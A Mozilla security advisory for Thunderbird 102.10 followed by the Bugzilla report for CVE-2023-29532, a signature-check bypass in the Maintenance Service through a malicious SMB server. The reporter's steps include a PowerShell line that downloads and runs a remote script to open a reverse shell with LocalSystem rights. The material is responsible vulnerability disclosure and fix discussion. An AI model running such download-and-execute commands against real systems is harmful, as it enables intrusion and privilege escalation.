=== Content from www.mozilla.org_db161f5b_20250114_221426.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-15

## Security Vulnerabilities fixed in Thunderbird 102.10

Announced
April 11, 2023
Impact
high
Products
Thunderbird
Fixed in

* Thunderbird 102.10

#### [#CVE-2023-29531: Out-of-bound memory access in WebGL on macOS](#CVE-2023-29531)

Reporter
DoHyun Lee
Impact
high
##### Description

An attacker could have caused an out of bounds memory access using WebGL APIs, leading to memory corruption and a potentially exploitable crash.
*This bug only affects Thunderbird for macOS. Other operating systems are unaffected.*

##### References

* [Bug 1794292](https://bugzilla.mozilla.org/show_bug.cgi?id=1794292)

#### [#CVE-2023-29532: Mozilla Maintenance Service Write-lock bypass](#CVE-2023-29532)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

A local attacker can trick the Mozilla Maintenance Service into applying an unsigned update file by pointing the service at an update file on a malicious SMB server. The update file can be replaced after the signature check, before the use, because the write-lock requested by the service does not work on a SMB server.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1806394](https://bugzilla.mozilla.org/show_bug.cgi?id=1806394)

#### [#CVE-2023-29533: Fullscreen notification obscured](#CVE-2023-29533)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A website could have obscured the fullscreen notification by using a combination of `window.open`, fullscreen requests, `window.name` assignments, and `setInterval` calls. This could have led to user confusion and possible spoofing attacks.

##### References

* [Bug 1814597](https://bugzilla.mozilla.org/show_bug.cgi?id=1814597)
* [Bug 1798219](https://bugzilla.mozilla.org/show_bug.cgi?id=1798219)

#### [#CVE-2023-1999: Double-free in libwebp](#CVE-2023-1999)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A double-free in libwebp could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1819244](https://bugzilla.mozilla.org/show_bug.cgi?id=1819244)

#### [#CVE-2023-29535: Potential Memory Corruption following Garbage Collector compaction](#CVE-2023-29535)

Reporter
Lukas Bernhard
Impact
high
##### Description

Following a Garbage Collector compaction, weak maps may have been accessed before they were correctly traced. This resulted in memory corruption and a potentially exploitable crash.

##### References

* [Bug 1820543](https://bugzilla.mozilla.org/show_bug.cgi?id=1820543)

#### [#CVE-2023-29536: Invalid free from JavaScript code](#CVE-2023-29536)

Reporter
zx from qriousec
Impact
high
##### Description

An attacker could cause the memory manager to incorrectly free a pointer that addresses attacker-controlled memory, resulting in an assertion, memory corruption, or a potentially exploitable crash.

##### References

* [Bug 1821959](https://bugzilla.mozilla.org/show_bug.cgi?id=1821959)

#### [#CVE-2023-0547: Revocation status of S/Mime recipient certificates was not checked](#CVE-2023-0547)

Reporter
Paul Menzel
Impact
high
##### Description

OCSP revocation status of recipient certificates was not checked when sending S/Mime encrypted email, and revoked certificates would be accepted. Thunderbird versions from 68 to 102.9.1 were affected by this bug.

##### References

* [Bug 1811298](https://bugzilla.mozilla.org/show_bug.cgi?id=1811298)

#### [#CVE-2023-29479: Hang when processing certain OpenPGP messages](#CVE-2023-29479)

Reporter
Ribose RNP Team
Impact
moderate
##### Description

Certain malformed OpenPGP messages could trigger incorrect parsing of PKESK/SKESK packets due to a bug in the Ribose RNP library used by Thunderbird up to version 102.9.1, which would cause the Thunderbird user interface to hang. The issue was discovered using Google's oss-fuzz.

##### References

* [Bug 1824978](https://bugzilla.mozilla.org/show_bug.cgi?id=1824978)

#### [#CVE-2023-29539: Content-Disposition filename truncation leads to Reflected File Download](#CVE-2023-29539)

Reporter
Trung Pham
Impact
moderate
##### Description

When handling the filename directive in the Content-Disposition header, the filename would be truncated if the filename contained a NULL character. This could have led to reflected file download attacks potentially tricking users to install malware.

##### References

* [Bug 1784348](https://bugzilla.mozilla.org/show_bug.cgi?id=1784348)

#### [#CVE-2023-29541: Files with malicious extensions could have been downloaded unsafely on Linux](#CVE-2023-29541)

Reporter
Ameen Basha M K
Impact
moderate
##### Description

Thunderbird did not properly handle downloads of files ending in `.desktop`, which can be interpreted to run attacker-controlled commands.
*This bug only affects Thunderbird for Linux on certain Distributions. Other operating systems are unaffected, and Mozilla is unable to enumerate all affected Linux Distributions.*

##### References

* [Bug 1810191](https://bugzilla.mozilla.org/show_bug.cgi?id=1810191)

#### [#CVE-2023-29542: Bypass of file download extension restrictions](#CVE-2023-29542)

Reporter
Shaheen Fazim and Ameen Basha M K
Impact
moderate
##### Description

A newline in a filename could have been used to bypass the file extension security mechanisms that replace malicious file extensions such as .lnk with .download. This could have led to accidental execution of malicious code.
*This bug only affects Thunderbird on Windows. Other versions of Thunderbird are unaffected.*

##### References

* [Bug 1815062](https://bugzilla.mozilla.org/show_bug.cgi?id=1815062)
* [Bug 1810793](https://bugzilla.mozilla.org/show_bug.cgi?id=1810793)

#### [#CVE-2023-29545: Windows Save As dialog resolved environment variables](#CVE-2023-29545)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Similar to CVE-2023-28163, this time when choosing 'Save Link As', suggested filenames containing environment variable names would have resolved those in the context of the current user.
*This bug only affects Thunderbird on Windows. Other versions of Thunderbird are unaffected.*

##### References

* [Bug 1823077](https://bugzilla.mozilla.org/show_bug.cgi?id=1823077)

#### [#CVE-2023-1945: Memory Corruption in Safe Browsing Code](#CVE-2023-1945)

Reporter
Gabriele Svelto
Impact
moderate
##### Description

Unexpected data returned from the Safe Browsing API could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1777588](https://bugzilla.mozilla.org/show_bug.cgi?id=1777588)

#### [#CVE-2023-29548: Incorrect optimization result on ARM64](#CVE-2023-29548)

Reporter
JunYoung Park
Impact
low
##### Description

A wrong lowering instruction in the ARM64 Ion compiler resulted in a wrong optimization result.

##### References

* [Bug 1822754](https://bugzilla.mozilla.org/show_bug.cgi?id=1822754)

#### [#CVE-2023-29550: Memory safety bugs fixed in Thunderbird 102.10](#CVE-2023-29550)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Andrew Osmond, Sebastian Hengst, Andrew McCreight, and the Mozilla Fuzzing Team reported memory safety bugs present in Thunderbird 102.9. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 102.10](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1720594%2C1751945%2C1812498%2C1814217%2C1818357%2C1818762%2C1819493%2C1820389%2C1820602%2C1821448%2C1822413%2C1824828)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_60cc302c_20250114_221423.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1806394)
* [XML](/show_bug.cgi?ctype=xml&id=1806394)

Closed
[Bug 1806394](/show_bug.cgi?id=1806394)
(CVE-2023-29532)

Opened 2 years ago
Closed 2 years ago

# Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service

## Categories

### (Toolkit :: Application Update, defect, P1)

[Product:](/describecomponents.cgi?product=Toolkit)

Toolkit
▾

Toolkit
The Mozilla Toolkit is a set of APIs, built on top of Gecko, which provide advanced services to XUL applications. These services include Profile Management, Chrome Registration, Browsing History, Extension and Theme Management, Application Update Service, and Safe Mode. ([More info](https://wiki.mozilla.org/Modules/Toolkit))
[See Open Bugs in This Product](/buglist.cgi?product=Toolkit&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Toolkit)
Watch This Product

[Component:](/describecomponents.cgi?product=Toolkit&component=Application%20Update#Application%20Update)

Application Update
▾

Toolkit :: Application Update
Application update for Firefox and Thunderbird.
[See Open Bugs in This Component](/buglist.cgi?product=Toolkit&component=Application%20Update&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Toolkit&component=Application%20Update&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Toolkit&component=Application%20Update)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 108

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

112 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |
| Install Update Workflow | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | [112+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=112%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed) |
| firefox109 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix) |
| firefox110 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=wontfix) |
| firefox111 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix) |
| firefox112 | [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 | 112+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox109 |  | wontfix |
| firefox110 |  | wontfix |
| firefox111 |  | wontfix |
| firefox112 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: hofusec, Assigned: bytesized, NeedInfo)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/96e4252ea3aebe64d73acae0a509f240?d=mm&size=40)  [bytesized](/user_profile?user_id=563604)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/270499a0d11a67b911327984af6ffe90?d=mm&size=40)  [hofusec](/user_profile?user_id=436533)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/50e82ef70720dfcf1385f583e34f9ba9?d=mm&size=40)  [erchen](/user_profile?user_id=753852)

NeedInfo From:

 [hofusec](/user_profile?user_id=436533)

[2 years ago](#c8)

[NeedInfo:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#needinfo)

Update

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-priv-escalation, reporter-external, sec-high, Whiteboard: enterprisey [post-critsmash-triage][adv-main112+][adv-esr102.10+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2023-29532

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

enterprisey [post-critsmash-triage][adv-main112+][adv-esr102.10+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a5555085_1689 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [btot](/user_profile?user_id=553429) | [qe-verify](#a6656675_553429 "2 years ago") | - |
| --- | --- | --- |
| [btot](/user_profile?user_id=553429) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 1 obsolete file)

| [poc.zip](/attachment.cgi?id=9308915)  [2 years ago](#c0)  [Holger Fuhrmannek](/user_profile?user_id=436533)   7.35 KB, application/zip |  | [Details](/attachment.cgi?id=9308915&action=edit) |
| --- | --- | --- |
| [Bug 1806394 r=nalexander!](/attachment.cgi?id=9314925)  [2 years ago](#c10)  [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)   48 bytes, text/x-phabricator-request | tjr : [sec-approval+](#c15 "2 years ago") | [Details](/attachment.cgi?id=9314925&action=edit) | [Review](/attachment.cgi?id=9314925) |
| [Bug 1806394 ESR102 rollup.patch](/attachment.cgi?id=9316657)  [2 years ago](#c13)  [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)   50.89 KB, patch |  | [Details](/attachment.cgi?id=9316657&action=edit) | [Diff](/attachment.cgi?id=9316657&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9316657) |
| [Bug 1806394 ESR102 rollup.patch](/attachment.cgi?id=9318233)  [2 years ago](#c23)  [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)   50.95 KB, patch | RyanVM : [approval-mozilla-esr102+](#c28 "2 years ago") | [Details](/attachment.cgi?id=9318233&action=edit) | [Diff](/attachment.cgi?id=9318233&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1806394&attachment=9318233) |
| [advisory.txt](/attachment.cgi?id=9327547)  [2 years ago](#c30)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   513 bytes, text/plain |  | [Details](/attachment.cgi?id=9327547&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Holger Fuhrmannek](/user_profile?user_id=436533)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1806394#c0)• 2 years ago |
|  | |

Attached file
[poc.zip](attachment.cgi?id=9308915)
— [Details](attachment.cgi?id=9308915&action=edit)

When updating with the Mozilla Maintenance Service, the update data is loaded via a user-controlled path that points to a mar archive. A signature check is performed, because only mar files from a trusted source should be used. The signature check only works as intended if the content of the mar file does not change, because the mar file is read twice, once for the signature check and once for the actual update. The mar file is only opened once and is write-locked so the mar file content should be static during the process, but this doesn't hold true if the file is read from a malicious SMB server. After the first read of the mar file for the signature verification, a malicious SMB server can provide a completely different mar file for the actual update so that the signature verification can be bypassed. This works at least on Windows 10 Pro, for which I was able to exploit the issue.

## Proof of Concept Exploit

The poc exploits the issue to invoke a reverse shell by the normal Windows user, running in the context of the LocalSystem account.

First the issue is exploited to downgrade `firefox 108.0.1` to a manipulated version of `firefox 47.0`. This version has the content of the `uninstaller\helper.exe` replaced with the content of the `updater.exe` and an addtional `uninstaller\MSASN1.dll` which contains a reverse shell payload. After the downgrade the MozillaMaintenance is used again. During the second update the `helper.exe` is called which loads the `MSASN1.dll` and executes the payload.

I tested the exploit on a fresh install of Windows 10 Pro with Microsoft Defender enabled. Antivirus solutions can interfere with the poc. The poc doesn't work if Microsoft Defender is disabled. The poc expects the mar file to be read twice (probably antivirus check + signature check) before a manipulated mar file will be delivered.

For the malicous SMB server the impacket python module is used.

### Steps to Reproduce:

On computer A which needs docker:

1.) download and extract poc files

2.) build docker container: `sudo docker build -t ffpoc .`

3.) start docker container: `sudo docker run --rm -it --name ffpoc -p 444:444 -p 445:445 -p 8080:8080 ffpoc <ip>`

`<ip>` has to be the reachable from the victim. Wait until the poc setup is completed.

On the victim computer B which has installed `Firefox 108.0.1` to `"C:\Program Files\Mozilla Firefox"` and the MozillaMaintenance Service to `"C:\Program Files (x86)\Mozilla Maintenance Service"` and has SMB enabled:

1.) Open the powershell console as the standard windows user and execute: `IEX (New-Object Net.WebClient).DownloadString('http://<ip>/client.ps1')`. After a few minutes a reverse shell from computer B to computer A will be started. Type `whoami` to check for priviledge escalation to the LocalSystem account.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1806394#c1)• 2 years ago |
|  | |

Nick: can you find the right owner for this bug.

We rate these `sec-high` because of the potential privilege escalation on a locked-down "enterprise" type installation. This is not much of a worry for the average Firefox user. Malware might also try using this, but most users will click "OK" when an installer-type thing asks them to elevate privileges so it's less necessary as an attack vector in that case.

Status: UNCONFIRMED → NEWEver confirmed: trueFlags: needinfo?(nalexander)Keywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)Whiteboard: enterprisey

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1806394#c2)• 2 years ago |
|  | |

> I tested the exploit on a fresh install of Windows 10 Pro with Microsoft Defender enabled. Antivirus solutions can interfere with the poc. The poc doesn't work if Microsoft Defender is disabled.

Just to confirm, are these statements the right way around (ie the exploit/PoC only works if Defender is enabled) ? It's somewhat incongruous with the "antivirus solutions can interfere with the PoC" statement.

Flags: needinfo?(hofusec)

|  | [Holger Fuhrmannek](/user_profile?user_id=436533)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1806394#c3)• 2 years ago |
|  | |

My point was that the number of additional file accesses can be different for different antivirus solutions - the poc expects one additional access, as I found when using Microsoft Defender. If other antivirus solutions trigger more additional accesses for some reason, the poc will not work.

Flags: needinfo?(hofusec)

|  | [bhearsum@mozilla.com (:bhearsum)](/user_profile?user_id=259016) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1806394#c4)• 2 years ago |
|  | |

Thank you for such a detailed report -- I was able to reproduce the issue first try.

I think the person best positioned to evaluate a fix is Kirk - moving the needinfo to him.

Severity: -- → S2Flags: needinfo?(nalexander) → needinfo?(bytesized)Priority: -- → P2

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1806394#c5)• 2 years ago |
|  | |

I am now back from vacation. I have a few things that I need to catch up on first, but once those are taken care of this will be my top priority.

Flags: needinfo?(bytesized)

|  | [Robin Steuber (she/her) [:bytesized]](/user_profile?user_id=563604)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1806394#c6)• 2 years ago |
|  | |

I haven't actually tried out the PoC, but the attack makes perfect sense to me and I don't really have any doubt that it can work.

I have considered several possible solutions to this. I'm not excited about any of them, but I think that the best option is to load the file into RAM and rely on that not being changed rather than to rely on the version on disk not being changed.

This does make me a bit nervous, particularly because this would be done during the staging process, which means that this will typically happen while Firefox is also running (and also using a whole bunch of RAM). But (a) I think that the amount of RAM that we will need is acceptable, and (b) the system will likely end up paging things to the disk anyways. Nevertheless, I want to make sure that if we fail to allocate the necessary amount of memory, we communicate that error to Firefox in such a way that we fall back to updating without staging, thus allowing us to allocate that memory when Firefox isn't running.

Assignee: nobody → bytesizedPriority: P2 → P1

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1806394#a3124080_578488)• 2 years ago |

Flags: sec-bounty?

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1806394#c7)• 2 years ago |
|  | |

(In reply to Robin Steuber (they/them) [:bytesized] from [comment #6](/show_bug.cgi?id=1806394#c6 "RESOLVED FIXED - Mar File Lock Bypass Leads to Privilege Escalation via Mozilla Maintenance Service"))

> I haven't actually tried out the PoC, but the attack makes perfect sense to me and I don't really have any doubt that it can work.
>
